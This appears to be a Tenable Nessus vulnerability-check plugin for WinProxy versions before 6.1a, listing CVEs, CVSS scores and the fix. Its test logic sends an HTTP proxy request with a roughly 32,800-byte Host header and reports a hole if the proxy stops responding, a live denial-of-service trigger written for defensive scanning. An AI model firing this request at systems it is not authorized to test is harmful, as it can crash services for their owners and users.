#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20391);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2005-3187", "CVE-2005-4085");
  script_bugtraq_id(16147, 16148);
  script_osvdb_id(22237, 22238);

  script_name(english:"WinProxy < 6.1a HTTP Proxy Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in WinProxy < 6.1a HTTP Proxy");

 script_set_attribute(attribute:"synopsis", value:
"The remote web proxy server is affected by denial of service and
buffer overflow vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running WinProxy, a proxy server for Windows. 

The installed version of WinProxy's HTTP proxy fails to handle long
requests as well as requests with long Host headers.  An attacker may
be able to exploit these issues to crash the proxy or even execute
arbitrary code on the affected host." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?40f07cd6" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?3a6c81a5" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8c88612f" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to WinProxy version 6.1a or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'Blue Coat WinProxy Host Header Overflow');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/01/10");
 script_set_attribute(attribute:"patch_publication_date", value: "2006/01/05");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/01/05");
 script_cvs_date("$Date: 2011/09/12 01:34:03 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"Firewalls");
  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");
  script_dependencies("find_service2.nasl", "httpver.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, dont_break: 1);


# Make sure it looks like WinProxy.
help = get_kb_banner(port: port, type: "help");
if (help && "Proxy-agent: BlueCoat-WinProxy" >< help) {
  # Flag it as a proxy.
  register_service(port:port, ipproto:"tcp", proto:"http_proxy");

  # Try to exploit it.
  rq = http_mk_proxy_request(port: 80, item: "/", host: "127.0.0.1", method: "GET", scheme: "http", version: 10, add_headers: make_array("Host", crap(32800)));

  w = http_send_recv_req(port: port, req: rq);
  # If we didn't get anything, try resending the query.
  w = http_send_recv3(port: port, item:"/", method:"GET");

  # There's a problem if we didn't get a response the second time.
    if (isnull(w)) security_hole(port);
}
